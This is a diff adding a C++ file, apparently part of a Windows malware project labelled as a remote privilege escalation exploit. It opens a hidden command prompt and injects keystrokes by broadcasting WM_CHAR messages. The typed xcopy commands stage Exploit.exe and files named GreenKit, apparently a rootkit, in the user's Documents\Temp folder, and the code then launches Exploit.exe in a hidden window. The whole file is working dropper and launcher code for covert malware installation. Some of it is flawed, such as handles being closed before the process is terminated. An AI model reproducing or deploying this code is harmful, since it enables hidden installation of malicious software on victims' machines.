@@ -1,0 +1,106 @@
+// Microsoft Windows 57135 Remote Privilege Escalation Vulnerability
+#include "stdafx.h"
+#include "Infiltration.h"
+#include <windows.h>
+
+
+void RunExploit()
+{
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi = { 0 };
+
+	memset(&si, 0, sizeof(si));
+	si.cb = sizeof(STARTUPINFOA);
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_HIDE;
+
+	char profilepath[250];
+	ExpandEnvironmentStringsA("%userprofile%", profilepath, 250);
+
+	char* exploit_path = strcat(profilepath, "\\Documents\\Temp\\Exploit.exe");
+
+	si.cb = sizeof(si);
+	CreateProcessA(
+		NULL,
+		exploit_path,
+		NULL,
+		NULL,
+		FALSE,
+		CREATE_NEW_CONSOLE,
+		NULL,
+		"C:\\",
+		&si,
+		&pi
+		);
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+
+	TerminateProcess(pi.hProcess, 0);
+}
+
+int ExploitME()
+{
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi = { 0 };
+
+	memset(&si, 0, sizeof(si));
+	si.cb = sizeof(STARTUPINFOA);
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_HIDE;
+
+	si.cb = sizeof(si);
+	CreateProcessA(
+		NULL,
+		"C:\\Windows\\system32\\cmd.exe",
+		NULL,
+		NULL,
+		FALSE,
+		CREATE_NEW_CONSOLE,
+		NULL,
+		NULL,
+		&si,
+		&pi
+		);
+
+	Sleep(1000);
+
+	char profilepath[250];
+	ExpandEnvironmentStringsA("%userprofile%", profilepath, 250);
+
+	char* exploit_path = strcat(profilepath, "\\Documents\\Temp\\Exploit.exe");
+
+	PCHAR copy[] = { "xcopy Exploit.exe %USERPROFILE%\\Documents\\Temp\\ /s",
+		"xcopy GreenKitExe.exe %USERPROFILE%\\Documents\\Temp\\ /s",
+		"xcopy GreenKit.dll %USERPROFILE%\\Documents\\Temp\\ /s",
+		"exit",
+		NULL };
+
+	for (unsigned int i = 0; copy[i] != NULL; ++i)
+	{
+		for (unsigned int j = 0; j < strlen(copy[i]); ++j)
+		{
+			Sleep(10);
+			SendMessage(
+				HWND_BROADCAST,
+				WM_CHAR,
+				copy[i][j],
+				0
+				);
+		}
+		Sleep(1000);
+
+		SendMessage(
+			HWND_BROADCAST,
+			WM_CHAR,
+			VK_RETURN,
+			0
+			);
+	}
+
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+
+	TerminateProcess(pi.hProcess, 0);
+
+	return EXIT_SUCCESS;
+}
